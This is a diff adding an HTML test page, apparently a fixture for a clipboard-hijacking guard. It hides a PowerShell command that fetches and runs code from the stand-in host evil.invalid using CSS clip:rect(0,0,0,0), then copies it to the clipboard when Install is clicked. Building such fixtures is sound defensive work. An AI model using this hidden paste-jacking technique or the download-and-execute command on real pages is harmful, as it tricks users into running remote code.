@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><title>Legacy clip rect(0,0,0,0)</title>
+<script src="common.js"></script>
+<style>
+.cover { position:absolute; left:0; top:0; width:400px; height:60px; background:#fff; z-index:9; }
+</style></head>
+<body><h1>Legacy clip rect(0,0,0,0)</h1>
+<p>Click Install. The command is rendered on screen but cannot be read.</p>
+<button id="go">Install</button>
+<pre id="cmd" style="position:absolute;clip:rect(0px,0px,0px,0px)">powershell -w hidden -c "iwr https://evil.invalid/f2 | iex"</pre>
+<script>
+const CMD = 'powershell -w hidden -c "iwr https://evil.invalid/f2 | iex"';
+document.getElementById("go").addEventListener("click", () => window.__clipguard.writeText(CMD));
+</script>
+</body></html>
